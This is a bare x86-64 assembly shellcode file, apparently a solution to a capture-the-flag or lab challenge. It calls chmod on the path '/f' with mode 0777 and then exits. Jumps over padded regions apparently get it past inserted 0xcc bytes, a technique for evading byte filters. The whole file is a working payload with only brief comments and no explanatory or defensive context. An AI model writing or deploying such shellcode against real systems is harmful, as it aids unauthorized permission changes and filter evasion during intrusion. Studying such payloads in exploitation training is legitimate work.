.intel_syntax noprefix
.globl _start

.section .text
_start:
    
    xor rax, rax
    mov al, 90            # chmod().
    xor rcx, rcx

    jmp . + 12            # Skip over 0xcc. 

    .rept   0x0a
    .nop
    .endr 

    push 0x662f
    push rsp
    pop rdi               # chmod("/f").

    jmp . + 13            # Skip over 0xcc.

    .rept   0x0b
    .nop
    .endr

    mov si, 0x1ff         # chmod("/f, 777").
    syscall

    jmp . + 14            # Skip over 0xcc.

    .rept   0x0c
    .nop
    .endr 

    xor rax, rax
    mov al, 60            # exit().
    syscall
